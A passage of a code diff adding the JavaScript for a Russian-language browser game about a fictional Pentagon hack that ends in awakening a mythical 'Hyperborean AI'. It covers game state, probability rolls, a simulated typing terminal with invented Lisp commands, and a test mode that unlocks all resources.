+                    required: ['lispInterpreter', 'runicCode'],
+                    bonuses: { runicCode: 0.25, lispInterpreter: 0.15 },
+                    penalties: {},
+                    gains: ['constellation'],
+                    detection: 15,
+                    loss: ['runicCode'],
+                    tags: ['гиперборейский', 'финал'],
+                    isHyperborean: true,
+                    terminalSuccess: [
+                        { type: 'command', text: '(load "runic-code.lisp")' },
+                        { type: 'output', text: 'LISP> (load "runic-code.lisp")' },
+                        { type: 'output', text: ';; Loading runic code...' },
+                        { type: 'output', text: ';; Runic symbols: ᛉ ᛟ ᚠ ᚢ ᚦ ᚨ ᚱ ᚲ ᚷ ᚹ ᚺ ᚾ ᛁ ᛃ ᛈ ᛇ ᛉ ᛊ ᛏ ᛒ ᛖ ᛗ ᛚ ᛝ ᛟ ᛞ' },
+                        { type: 'output', text: ';; Constellation calibration initiated.' },
+                        { type: 'hyperborean', text: '☉ THE RUNES ARE LOADED. REALITY SHIFTS.' },
+                        { type: 'success', text: '[+] Runic code loaded. Constellation calibrated.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: '(load "runic-code.lisp")' },
+                        { type: 'output', text: 'LISP> (load "runic-code.lisp")' },
+                        { type: 'output', text: ';; Error: Invalid runic sequence.' },
+                        { type: 'error', text: '[!] Runic code rejected by LISP machine.' }
+                    ]
+                },
+                {
+                    id: 'activate_ai',
+                    label: 'Запуск гиперборейского ИИ',
+                    hint: 'Финальная активация древнего искусственного интеллекта.',
+                    marker: 'MARKER_ACTIVATE_AI',
+                    baseProb: 0.75,
+                    required: ['artifact', 'runicCode', 'lispInterpreter', 'constellation'],
+                    bonuses: { artifact: 0.10, runicCode: 0.10, lispInterpreter: 0.10, constellation: 0.10 },
+                    penalties: {},
+                    gains: [],
+                    detection: 40,
+                    loss: ['artifact', 'runicCode', 'lispInterpreter', 'constellation'],
+                    tags: ['гиперборейский', 'финал'],
+                    isHyperborean: true,
+                    isFinal: true,
+                    terminalSuccess: [
+                        { type: 'command', text: '(activate-hyperborean-ai)' },
+                        { type: 'output', text: 'LISP> (activate-hyperborean-ai)' },
+                        { type: 'output', text: ';; INITIALIZING HYPERBOREAN AI...' },
+                        { type: 'output', text: ';; Artifact: OK' },
+                        { type: 'output', text: ';; Runic code: OK' },
+                        { type: 'output', text: ';; Interpreter: OK' },
+                        { type: 'output', text: ';; Constellation: CALIBRATED' },
+                        { type: 'output', text: ';;' },
+                        { type: 'hyperborean', text: '╔══════════════════════════════════════════════════╗' },
+                        { type: 'hyperborean', text: '║  HYPERBOREAN AI ACTIVATED                       ║' },
+                        { type: 'hyperborean', text: '║  REALITY ALTERED. NEW WORLD EMERGES.           ║' },
+                        { type: 'hyperborean', text: '║  THE ANCIENT ONES HAVE RETURNED.              ║' },
+                        { type: 'hyperborean', text: '╚══════════════════════════════════════════════════╝' },
+                        { type: 'success', text: '🏆 REALITY REWRITTEN. THE AI AWAKENS.' }
+                    ],
+                    terminalFail: [
+                        { type: 'command', text: '(activate-hyperborean-ai)' },
+                        { type: 'output', text: 'LISP> (activate-hyperborean-ai)' },
+                        { type: 'output', text: ';; ERROR: Constellation not calibrated.' },
+                        { type: 'error', text: '[!] AI activation failed. Reality unchanged.' }
+                    ]
+                }
+            ];
+
+            // ---- СОСТОЯНИЕ ----
+            const state = {
+                resources: Object.fromEntries(RESOURCE_KEYS.map(k => [k, false])),
+                detection: 0,
+                attempts: 0,
+                gameOver: false,
+                victory: false,
+                startTime: Date.now(),
+                logEntries: [],
+                hintsEnabled: false,
+                testMode: TEST_MODE,
+            };
+
+            // Если тестовый режим — открываем все ресурсы
+            if (state.testMode) {
+                RESOURCE_KEYS.forEach(key => {
+                    state.resources[key] = true;
+                });
+                // Показываем бейдж
+                document.getElementById('testModeBadge').style.display = 'inline';
+                document.getElementById('testModeBadge').innerHTML = '<span class="test-mode-badge">🧪 ТЕСТ-РЕЖИМ</span>';
+            }
+
+            // ---- DOM ----
+            const resourcesEl = document.getElementById('resourcesContainer');
+            const actionsEl = document.getElementById('actionsContainer');
+            const logContainer = document.getElementById('logContainer');
+            const progressDisplay = document.getElementById('progressDisplay');
+            const accessDisplay = document.getElementById('accessDisplay');
+            const detectionDisplay = document.getElementById('detectionDisplay');
+            const attemptsDisplay = document.getElementById('attemptsDisplay');
+            const levelDisplay = document.getElementById('levelDisplay');
+            const resetBtn = document.getElementById('resetBtn');
+            const secretFilesEl = document.getElementById('secretFiles');
+            const progressText = document.getElementById('progressText');
+            const ownedResourcesEl = document.getElementById('ownedResources');
+            const availableActionsEl = document.getElementById('availableActions');
+            const hintCheckbox = document.getElementById('hintCheckbox');
+            const hintLabel = document.getElementById('hintLabel');
+
+            // Тултип
+            const tooltipBox = document.getElementById('tooltipBox');
+            const tooltipName = document.getElementById('tooltipName');
+            const tooltipType = document.getElementById('tooltipType');
+            const tooltipDescription = document.getElementById('tooltipDescription');
+            const tooltipMeta = document.getElementById('tooltipMeta');
+            const tooltipClose = document.getElementById('tooltipClose');
+
+            // Терминал
+            const terminalOverlay = document.getElementById('terminalOverlay');
+            const terminalBody = document.getElementById('terminalBody');
+            const closeTerminalBtn = document.getElementById('closeTerminalBtn');
+            const statusTextTerminal = document.getElementById('statusText');
+            const progressTextTerminal = document.getElementById('progressTextTerminal');
+
+            let tooltipVisible = false;
+
+            // ---- ВСПОМОГАТЕЛЬНЫЕ ----
+            function getTime() {
+                const elapsed = Math.floor((Date.now() - state.startTime) / 1000);
+                const mins = String(Math.floor(elapsed / 60)).padStart(2, '0');
+                const secs = String(elapsed % 60).padStart(2, '0');
+                return `[${mins}:${secs}]`;
+            }
+
+            function addLog(message, type = 'info') {
+                const time = getTime();
+                state.logEntries.push({ time, message, type });
+                const entry = document.createElement('div');
+                entry.className = `log-entry ${type}`;
+                entry.innerHTML = `<span class="time">${time}</span> ${message}`;
+                logContainer.appendChild(entry);
+                logContainer.scrollTop = logContainer.scrollHeight;
+            }
+
+            function getResourceLabel(key) {
+                return RESOURCE_DEFS[key]?.label || key;
+            }
+
+            function isResourceHyperborean(key) {
+                return RESOURCE_DEFS[key]?.isHyperborean || false;
+            }
+
+            function getDescription(marker) {
+                return DESCRIPTIONS[marker] || '📖 Описание отсутствует. Маркер: ' + marker;
+            }
+
+            // ---- ТУЛТИП ----
+            function showTooltip(title, type, marker, metaData, x, y) {
+                const description = getDescription(marker);
+                const isHyper = marker && marker.includes('HYPERBOREAN');
+
+                tooltipName.textContent = title;
+                tooltipType.textContent = type;
+                tooltipType.className = 'badge-type ' + (isHyper ? 'hyperborean' : (type === 'ресурс' ? 'resource' :
+                'action'));
+                tooltipDescription.textContent = description;
+
+                let metaHtml = '';
+                if (type === 'ресурс' && metaData && metaData.status) {
+                    metaHtml += `<span>${metaData.status}</span>`;
+                }
+                if (isHyper) {
+                    metaHtml += `<span>🌀 Гиперборейский артефакт</span>`;
+                }
+                tooltipMeta.innerHTML = metaHtml;
+
+                tooltipBox.style.display = 'block';
+                tooltipBox.style.left = Math.min(x + 20, window.innerWidth - 500) + 'px';
+                tooltipBox.style.top = Math.min(y + 10, window.innerHeight - 300) + 'px';
+
+                tooltipVisible = true;
+            }
+
+            function hideTooltip() {
+                tooltipBox.style.display = 'none';
+                tooltipVisible = false;
+            }
+
+            // ---- РАСЧЁТ ВЕРОЯТНОСТИ ----
+            function calculateProb(action) {
+                let prob = action.baseProb || 0.30;
+                for (const req of (action.required || [])) {
+                    if (!state.resources[req]) return 0;
+                }
+                for (const [res, bonus] of Object.entries(action.bonuses || {})) {
+                    if (state.resources[res]) prob += bonus;
+                }
+                for (const [res, penalty] of Object.entries(action.penalties || {})) {
+                    if (!state.resources[res]) prob -= penalty;
+                }
+                return Math.min(Math.max(prob, 0.05), 0.95);
+            }
+
+            function isActionAvailable(action) {
+                const reqs = action.required || [];
+                return reqs.every(r => state.resources[r]);
+            }
+
+            // ---- РЕНДЕРИНГ ----
+            function renderResources() {
+                let html = '';
+                const ownedCount = RESOURCE_KEYS.filter(k => state.resources[k]).length;
+
+                for (const key of RESOURCE_KEYS) {
+                    const owned = state.resources[key] || false;
+                    const isHyper = isResourceHyperborean(key);
+                    const cls = owned ? (isHyper ? 'resource hyperborean' : 'resource owned') : (isHyper ?
+                        'resource hyperborean missing' : 'resource missing');
+                    const icon = owned ? (isHyper ? '🌀' : '✅') : (isHyper ? '🔮' : '❌');
+                    const marker = RESOURCE_DEFS[key].marker;
+                    const label = getResourceLabel(key);
+                    const status = owned ? (isHyper ? '🌀 Есть' : '✅ Есть') : (isHyper ? '🔮 Нет' : '❌ Нет');
+                    html +=
+                        `<span class="${cls}" data-resource="${key}" data-marker="${marker}" data-label="${label}" data-status="${status}">${icon} ${label}</span>`;
+                }
+
+                const detCls = state.detection > 70 ? 'resource danger' : 'resource owned';
+                const detIcon = state.detection > 70 ? '🔴' : '⚠️';
+                html += `<span class="${detCls}" style="width:100%;margin-top:6px;">${detIcon} Обнаружение: ${Math.round(state.detection)}%</span>`;
+                resourcesEl.innerHTML = html;
+
+                // ПКМ для ресурсов
+                document.querySelectorAll('.resource').forEach(el => {
+                    el.addEventListener('contextmenu', function(e) {
+                        e.preventDefault();
+                        const marker = this.dataset.marker;
+                        const label = this.dataset.label;
+                        const status = this.dataset.status || '❓ Неизвестно';
+                        showTooltip(label, 'ресурс', marker, { status: status }, e.clientX, e.clientY);
+                    });
+                });
+
+                const availableActions = ALL_ACTIONS.filter(a => isActionAvailable(a) && !a.isFinal && !state.victory);
+                const finalAvailable = ALL_ACTIONS.filter(a => a.isFinal && isActionAvailable(a) && !state.victory);
+
+                ownedResourcesEl.textContent = ownedCount;
+                availableActionsEl.textContent = availableActions.length + finalAvailable.length;
+                progressDisplay.textContent = `${ownedCount}/${RESOURCE_KEYS.length}`;
+
+                const totalAvailable = availableActions.length + finalAvailable.length;
+                accessDisplay.textContent = state.victory ? '🌀 ИИ АКТИВИРОВАН' : (state.gameOver ? '⛔ БЛОКИРОВКА' :
+                    `${totalAvailable} действий`);
+                detectionDisplay.textContent = `${Math.round(state.detection)}%`;
+                detectionDisplay.style.color = state.detection > 70 ? '#ff7a7a' : '#b0d8ff';
+                attemptsDisplay.textContent = state.attempts;
+                levelDisplay.textContent = state.victory ? '🌀 ПОБЕДА' : (state.gameOver ? '💀 ПРОВАЛ' : '🔓 ВЗЛОМ');
+
+                if (state.victory) {
+                    progressText.textContent = '🌀 Гиперборейский ИИ активирован! Реальность переписана.';
+                } else if (state.gameOver) {
+                    progressText.textContent = '⛔ Операция провалена. Обнаружение критическое.';
+                } else {
+                    const hasArtifact = state.resources.artifact;
+                    const hasRunic = state.resources.runicCode;
+                    const hasLisp = state.resources.lispInterpreter;
+                    const hasConstellation = state.resources.constellation;
+                    if (hasArtifact && hasRunic && hasLisp && hasConstellation) {
+                        progressText.textContent = '🌀 Все ресурсы собраны! Активируйте гиперборейский ИИ.';
+                    } else if (hasArtifact || hasRunic || hasLisp || hasConstellation) {
+                        progressText.textContent =
+                        '🌀 Вы нашли гиперборейские артефакты. Продолжайте собирать ресурсы для активации ИИ.';
+                    } else {
+                        progressText.textContent = '🎯 Проникните в архив Пентагона и найдите путь к Лисп-машине.';
+                    }
+                }
+            }
+
+            function renderActions() {
+                if (state.victory) {
+                    actionsEl.innerHTML =
+                        `<div style="color:#d4a0ff;font-size:17px;font-weight:bold;text-shadow:0 0 40px rgba(120,60,180,0.5);">🌀 ГИПЕРБОРЕЙСКИЙ ИИ АКТИВИРОВАН! Реальность переписана.</div>`;
+                    return;
+                }
+                if (state.gameOver) {
+                    actionsEl.innerHTML =
+                        `<div style="color:#ff7a7a;font-size:17px;font-weight:bold;">⛔ ОПЕРАЦИЯ ПРОВАЛЕНА. Система обнаружила вторжение.</div>`;
+                    return;
+                }
+
+                const allActions = [...ALL_ACTIONS];
+
+                // В тестовом режиме все действия доступны, сортируем по isFinal
+                if (state.testMode) {
+                    allActions.sort((a, b) => {
+                        if (a.isFinal && !b.isFinal) return 1;
+                        if (!a.isFinal && b.isFinal) return -1;
+                        if (a.isHyperborean && !b.isHyperborean) return 1;
+                        if (!a.isHyperborean && b.isHyperborean) return -1;
+                        return 0;
+                    });
+                } else {
+                    allActions.sort((a, b) => {
+                        const availA = isActionAvailable(a);
+                        const availB = isActionAvailable(b);
+                        if (availA && !availB) return -1;
+                        if (!availA && availB) return 1;
+                        if (a.isHyperborean && !b.isHyperborean) return 1;
+                        if (!a.isHyperborean && b.isHyperborean) return -1;
+                        return 0;
+                    });
+                }
+
+                let html = '';
+                const hintsOn = state.hintsEnabled;
+
+                allActions.forEach(action => {
+                    const prob = calculateProb(action);
+                    const available = isActionAvailable(action) || state.testMode;
+                    const disabled = !available || state.detection >= 100;
+                    const isHyper = action.isHyperborean || false;
+
+                    let chanceLabel = '';
+                    let chanceClass = '';
+                    if (!available) {
+                        chanceLabel = '🔒 НЕДОСТУПНО';
+                        chanceClass = 'zero';
+                    } else if (prob >= 0.7) {
+                        chanceLabel = '🟢 ВЫСОКИЙ';
+                        chanceClass = 'high';
+                    } else if (prob >= 0.4) {
+                        chanceLabel = '🟡 СРЕДНИЙ';
+                        chanceClass = 'medium';
+                    } else {
+                        chanceLabel = '🔴 НИЗКИЙ';
+                        chanceClass = 'low';
+                    }
+
+                    const requiredResources = action.required || [];
+                    let reqTags = '';
+                    if (requiredResources.length > 0) {
+                        reqTags = requiredResources.map(r => {
+                            const owned = state.resources[r] || false;
+                            const isHyperRes = isResourceHyperborean(r);
+                            const cls = owned ? (isHyperRes ? 'required owned hyperborean' : 'required owned') :
+                                (isHyperRes ? 'required hyperborean' : 'required');
+                            return `<span class="action-res-tag ${cls}">${owned ? (isHyperRes ? '🌀' : '✅') : (isHyperRes ? '🔮' : '❌')} ${getResourceLabel(r)}</span>`;
+                        }).join('');
+                    } else {
+                        reqTags = `<span style="color:#4a6a7a;font-size:11px;">Нет требований</span>`;
+                    }
+
+                    const gainResources = action.gains || [];
+                    let gainTags = '';
+                    if (gainResources.length > 0) {
+                        gainTags = gainResources.map(r => {
+                            const owned = state.resources[r] || false;
+                            const isHyperRes = isResourceHyperborean(r);
+                            const cls = owned ? (isHyperRes ? 'gained owned hyperborean' : 'gained owned') :
+                                (isHyperRes ? 'gained hyperborean' : 'gained');
+                            return `<span class="action-res-tag ${cls}">${owned ? (isHyperRes ? '🌀' : '✅') : (isHyperRes ? '🔮' : '⬜')} ${getResourceLabel(r)}</span>`;
+                        }).join('');
+                    } else {
+                        gainTags = `<span style="color:#4a6a7a;font-size:11px;">Ничего не даёт</span>`;
+                    }
+
+                    let tagsHtml = '';
+                    if (action.tags && action.tags.length > 0) {
+                        tagsHtml = `<span class="action-tags">${action.tags.map(t => `<span class="action-tag${isHyper ? ' hyperborean' : ''}">#${t}</span>`).join('')}</span>`;
+                    }
+
+                    const isLocked = !available;
+                    const btnClass = isHyper ? 'action-btn action-hyperborean' : 'action-btn';
+
+                    let statusText = '';
+                    let statusClass = '';
+                    if (hintsOn) {
+                        if (isLocked) {
+                            const missing = requiredResources.filter(r => !state.resources[r]);
+                            statusText = `🔒 Требуются: ${missing.map(r => getResourceLabel(r)).join(', ')}`;
+                            statusClass = 'blocked';
+                        } else {
+                            statusText = '✅ Готов к выполнению';
+                            statusClass = 'ready';
+                        }
+                    }
+
+                    const hintClass = hintsOn ? 'hint-visible' : 'hint-hidden';
+
+                    html += `
+                        <button class="${btnClass}" data-action="${action.id}" data-marker="${action.marker}" data-label="${action.label}" ${disabled ? 'disabled' : ''}>
+                            <span class="action-label">
+                                ${isHyper ? '🌀 ' : ''}${action.label}
+                                ${action.isFinal ? ' 🏆' : ''}
+                                ${isHyper ? ' ⚡' : ''}
+                                ${isLocked ? `<span class="action-locked-badge">🔒 ЗАБЛОКИРОВАНО</span>` : ''}
+                            </span>
+                            <span class="action-hint">${action.hint}</span>
+
+                            <span class="action-chance ${chanceClass} ${hintClass}">${chanceLabel}</span>
+
+                            <div class="action-resource-block ${hintClass}">
+                                <span class="block-label">🔴 ТРЕБУЕТ <span class="count">(${requiredResources.length})</span></span>
+                                <div>${reqTags}</div>
+                            </div>
+
+                            <div class="action-resource-block ${hintClass}">
+                                <span class="block-label">🟢 ОТКРЫВАЕТ <span class="count">(${gainResources.length})</span></span>
+                                <div>${gainTags}</div>
+                            </div>
+
+                            ${tagsHtml}
+
+                            ${statusText ? `<span class="action-status-text ${statusClass} ${hintClass}">${statusText}</span>` : ''}
+                        </button>
+                    `;
+                });
+
+                actionsEl.innerHTML = html;
+
+                // ПКМ для действий
+                document.querySelectorAll('.action-btn').forEach(el => {
+                    el.addEventListener('contextmenu', function(e) {
+                        e.preventDefault();
+                        const marker = this.dataset.marker;
+                        const label = this.dataset.label;
+                        showTooltip(label, 'действие', marker, null, e.clientX, e.clientY);
+                    });
+                });
+
+                document.querySelectorAll('.action-btn:not(:disabled)').forEach(btn => {
+                    btn.addEventListener('click', function(e) {
+                        const actionId = this.dataset.action;
+                        handleActionClick(actionId);
+                    });
+                });
+            }
+
+            function renderAll() {
+                renderResources();
+                renderActions();
+                if (state.victory) {
+                    secretFilesEl.innerHTML = `
+                        <div class="file-reveal hyperborean">
+                            <div class="title">🌀 ГИПЕРБОРЕЙСКИЙ ИИ АКТИВИРОВАН</div>
+                            <span style="color:#d4a0ff;">✔ Реальность переписана. Древние знания восстановлены.</span><br>
+                            <span style="color:#b080d0;">📄 Расшифровка: Лисп-машина запущена, ИИ интегрирован с реальностью.</span><br>
+                            <span style="color:#b080d0;">🔑 Ключ доступа: ᛉ ᛟ ᚠ ᚢ ᚦ ᚨ ᚱ ᚲ ᚷ ᚹ ᚺ ᚾ ᛁ ᛃ ᛈ ᛇ ᛉ ᛊ ᛏ ᛒ ᛖ ᛗ ᛚ ᛝ ᛟ ᛞ</span><br>
+                            <span style="color:#b080d0;">📍 Новая реальность: 42°N 112°W — Врата гипербореев</span>
+                        </div>
+                    `;
+                } else {
+                    secretFilesEl.innerHTML = '';
+                }
+            }
+
+            // ---- ТЕРМИНАЛ ----
+            async function runTerminal(action, success) {
+                return new Promise((resolve) => {
+                    const scenario = success ? action.terminalSuccess : action.terminalFail;
+                    if (!scenario || scenario.length === 0) {
+                        resolve();
+                        return;
+                    }
+
+                    terminalBody.innerHTML = '';
+                    terminalOverlay.classList.add('active');
+                    statusTextTerminal.textContent = success ? '● ВЫПОЛНЕНИЕ...' : '● ВЫПОЛНЕНИЕ...';
+                    progressTextTerminal.textContent = '0%';
+
+                    let isRunning = true;
+
+                    function addTerminalLine(lineData) {
+                        return new Promise((res) => {
+                            const div = document.createElement('div');
+                            div.className = `line ${lineData.type}`;
+                            const text = lineData.text || '';
+                            if (lineData.type === 'command') {
+                                div.textContent = '$ ' + text;
+                                terminalBody.appendChild(div);
+                                terminalBody.scrollTop = terminalBody.scrollHeight;
+                                playReturn();
+                                setTimeout(res, 200);
+                            } else {
+                                div.textContent = text;
+                                terminalBody.appendChild(div);
+                                terminalBody.scrollTop = terminalBody.scrollHeight;
+                                let charIndex = 0;
+                                const chars = text.split('');
+                                div.textContent = '';
+                                function typeChar() {
+                                    if (!isRunning) {
+                                        div.textContent = text;
+                                        res();
+                                        return;
+                                    }
+                                    if (charIndex < chars.length) {
+                                        div.textContent += chars[charIndex];
+                                        if (chars[charIndex] !== ' ') {
+                                            playKeyClick(0.03 + Math.random() * 0.02);
+                                        }
+                                        charIndex++;
+                                        terminalBody.scrollTop = terminalBody.scrollHeight;
+                                        const delay = chars[charIndex - 1] === ' ' ? 20 : 30 + Math.random() * 20;
+                                        setTimeout(typeChar, delay);
+                                    } else {
+                                        res();
+                                    }
+                                }
+                                typeChar();
+                            }
+                        });
+                    }
+
+                    async function runScenario() {
+                        const totalLines = scenario.length;
+                        for (let i = 0; i < totalLines; i++) {
+                            if (!isRunning) break;
+                            await addTerminalLine(scenario[i]);
+                            const progress = Math.round(((i + 1) / totalLines) * 100);
+                            progressTextTerminal.textContent = progress + '%';
+                            if (scenario[i].type === 'success') {
+                                statusTextTerminal.textContent = '✅ УСПЕШНО';
+                                playSuccessSound();
+                            } else if (scenario[i].type === 'error') {
+                                statusTextTerminal.textContent = '❌ ОШИБКА';
+                                playErrorSound();
+                            } else if (scenario[i].type === 'hyperborean') {
+                                statusTextTerminal.textContent = '🌀 ГИПЕРБОРЕЙ';
+                                playHyperboreanSound();
+                            }
+                        }
+                        if (isRunning) {
+                            if (success && action.isFinal) {
+                                statusTextTerminal.textContent = '🌀 ИИ АКТИВИРОВАН';
+                            } else {
+                                statusTextTerminal.textContent = success ? '✅ ВЗЛОМ УСПЕШЕН' : '❌ ВЗЛОМ ПРОВАЛЕН';
+                            }
+                            progressTextTerminal.textContent = '100%';
+                        }
+                    }
+
+                    const closeHandler = () => {
+                        isRunning = false;
+                        terminalOverlay.classList.remove('active');
+                        closeTerminalBtn.removeEventListener('click', closeHandler);
+                        resolve();
+                    };
+
+                    closeTerminalBtn.addEventListener('click', closeHandler);
+                    terminalOverlay.addEventListener('click', function(e) {
+                        if (e.target === terminalOverlay) {
+                            closeHandler();
+                        }
+                    });
+
+                    runScenario();
+
+                    const escHandler = (e) => {
+                        if (e.key === 'Escape' && terminalOverlay.classList.contains('active')) {
+                            closeHandler();
+                            document.removeEventListener('keydown', escHandler);
+                        }
+                    };
+                    document.addEventListener('keydown', escHandler);
+                });
+            }
+
+            // ---- ОБРАБОТКА КЛИКА ----
+            async function handleActionClick(actionId) {
+                if (state.victory || state.gameOver) return;
+                if (state.detection >= 100) {
+                    state.gameOver = true;
+                    addLog('⛔ ОБНАРУЖЕНИЕ КРИТИЧЕСКОЕ! Операция провалена.', 'fail');
+                    renderAll();
+                    return;
+                }
+
+                const action = ALL_ACTIONS.find(a => a.id === actionId);
+                if (!action) return;
+
+                if (!isActionAvailable(action) && !state.testMode) return;
+
+                const prob = calculateProb(action);
+                if (prob === 0 && !state.testMode) return;
+
+                const roll = Math.random();
+                const success = roll < prob;
+
+                await runTerminal(action, success);
+
+                if (success) {
+                    state.attempts++;
+                    if (action.gains && action.gains.length > 0) {
+                        action.gains.forEach(resKey => {
+                            if (!state.resources[resKey]) {
+                                state.resources[resKey] = true;
+                                const isHyper = isResourceHyperborean(resKey);
+                                addLog(`${isHyper ? '🌀' : '✅'} Получен ресурс: ${getResourceLabel(resKey)}`,
+                                    isHyper ? 'hyperborean' : 'resource');
+                            }
+                        });
+                    }
+                    if (state.detection > 3) {
+                        state.detection = Math.max(0, state.detection - 3);
+                    }
+                    if (action.isFinal) {
+                        state.victory = true;
+                        addLog('🌀 ГИПЕРБОРЕЙСКИЙ ИИ АКТИВИРОВАН! Реальность переписана.', 'victory');
+                        playHyperboreanSound();
+                        renderAll();
+                        return;
+                    }
+                    addLog(`✅ Успех! Действие выполнено.`, 'success');
+                    renderAll();
+                } else {
+                    state.attempts++;
+                    if (action.detection) {
+                        state.detection += action.detection;
+                        addLog(`⚠️ Обнаружение +${action.detection}% (${Math.round(state.detection)}%)`, 'warn');
+                    }
+                    if (action.loss && action.loss.length > 0) {
+                        action.loss.forEach(resKey => {
+                            if (state.resources[resKey]) {
+                                state.resources[resKey] = false;
+                                const isHyper = isResourceHyperborean(resKey);
+                                addLog(`${isHyper ? '🌀' : '❌'} Потерян ресурс: ${getResourceLabel(resKey)}`,
+                                    isHyper ? 'hyperborean' : 'fail');
+                            }
+                        });
+                    }
+                    if (state.detection >= 100) {
+                        state.gameOver = true;
+                        addLog('⛔ ОБНАРУЖЕНИЕ КРИТИЧЕСКОЕ! Операция провалена.', 'fail');
+                        renderAll();
+                        return;
+                    }
+                    addLog(`❌ Неудача. Попытка #${state.attempts}`, 'fail');
+                    renderAll();
+                }
+            }
+
+            // ---- СБРОС ----
+            function resetGame() {
+                if (state.testMode) {
+                    // В тестовом режиме все ресурсы остаются открытыми
+                    state.resources = Object.fromEntries(RESOURCE_KEYS.map(k => [k, true]));
+                } else {
+                    state.resources = Object.fromEntries(RESOURCE_KEYS.map(k => [k, false]));
+                }
+                state.detection = 0;
+                state.attempts = 0;
+                state.gameOver = false;
+                state.victory = false;
+                state.startTime = Date.now();
+                state.logEntries = [];
+
+                logContainer.innerHTML = '';
+                addLog('🔄 Операция перезапущена.', 'info');
+                if (state.testMode) {
+                    addLog('🧪 ТЕСТ-РЕЖИМ АКТИВЕН: все ресурсы открыты.', 'warn');
+                }
+                addLog('📡 Начало взлома Пентагона. Цель: Лисп-машина и гиперборейский ИИ.', 'info');
+                addLog('🌀 Ищите артефакты, рунический код и калибруйте созвездия.', 'hyperborean');
+                addLog('🖱 ПКМ по ресурсу или действию — справочная информация.', 'info');
+
+                renderAll();
+            }
+
+            // ---- ПЕРЕКЛЮЧАТЕЛЬ ПОДСКАЗОК ----
+            hintCheckbox.addEventListener('change', function() {
+                state.hintsEnabled = this.checked;
+                hintLabel.classList.toggle('active', this.checked);
+                renderActions();
+            });
+
+            // ---- ЗАКРЫТИЕ ТУЛТИПА ----
+            tooltipClose.addEventListener('click', hideTooltip);
+
+            document.addEventListener('click', function(e) {
+                if (tooltipVisible && !tooltipBox.contains(e.target) && !e.target.closest('.resource') && !e.target.closest(
+                        '.action-btn')) {
+                    hideTooltip();
+                }
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && tooltipVisible) {
+                    hideTooltip();
+                }
+            });
+
+            // ---- ИНИЦИАЛИЗАЦИЯ ----
+            resetBtn.addEventListener('click', resetGame);
+
+            document.addEventListener('click', function() {
+                initAudio();
+            }, { once: true });
+
+            state.hintsEnabled = false;
+            hintCheckbox.checked = false;
+            hintLabel.classList.remove('active');
+
+            addLog('📡 Начало взлома Пентагона. Цель: Лисп-машина и гиперборейский ИИ.', 'info');
+            addLog('🌀 Ищите артефакты, рунический код и калибруйте созвездия.', 'hyperborean');
+            if (state.testMode) {
+                addLog('🧪 ТЕСТ-РЕЖИМ АКТИВЕН: все ресурсы открыты.', 'warn');
+            }
+            addLog('🖱 ПКМ по ресурсу или действию — справочная информация.', 'info');
+            renderAll();
+
+            console.log('🌀 Гиперборейский взлом · ПКМ для справки. Удачи, агент.');
+            if (state.testMode) {
+                console.log('🧪 ТЕСТ-РЕЖИМ: все ресурсы открыты.');
+            }
+        })();
+    </script>
+
+</body>
+</html>
